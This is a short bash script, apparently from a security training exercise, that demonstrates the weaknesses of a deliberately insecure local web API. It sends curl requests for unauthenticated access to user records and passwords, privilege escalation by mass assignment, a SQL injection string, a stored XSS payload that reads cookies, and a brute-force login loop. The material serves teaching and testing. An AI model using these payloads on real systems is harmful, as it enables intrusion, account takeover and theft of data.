#!/usr/bin/env bash
# Demonstrates the baseline weaknesses of the insecure starter. Requires: curl, jq
API=${API:-http://localhost:5080}
echo "== W4: read another user's record (incl. password) without logging in"
curl -s "$API/api/users/2" | jq '{username, password, email, phone}'
echo "== W5: privilege escalation via mass assignment (make bob an Admin)"
curl -s -X PUT "$API/api/users/2" -H 'Content-Type: application/json' -d "$(curl -s $API/api/users/2 | jq '.role="Admin"')" | jq '{username, role}'
echo "== W7: SQL injection in search (returns every blog)"
curl -s -G "$API/api/blogs/search" --data-urlencode "q=zzz' OR 1=1 --" | jq 'length'
echo "== W9: post a blog as another user with a script payload (W8 stored XSS)"
curl -s -X POST "$API/api/blogs" -H 'Content-Type: application/json' -d '{"authorId":1,"title":"hi","body":"<img src=x onerror=alert(document.cookie)>"}' | jq '{id, authorId, body}'
echo "== W11: verbose error"
curl -s "$API/api/debug/crash" | head -c 400; echo
echo "== W12: no rate limit - 50 wrong logins in a row"
for i in $(seq 1 50); do curl -s -o /dev/null -w "%{http_code} " -X POST "$API/api/auth/login" -H 'Content-Type: application/json' -d '{"username":"alice","password":"x"}'; done; echo
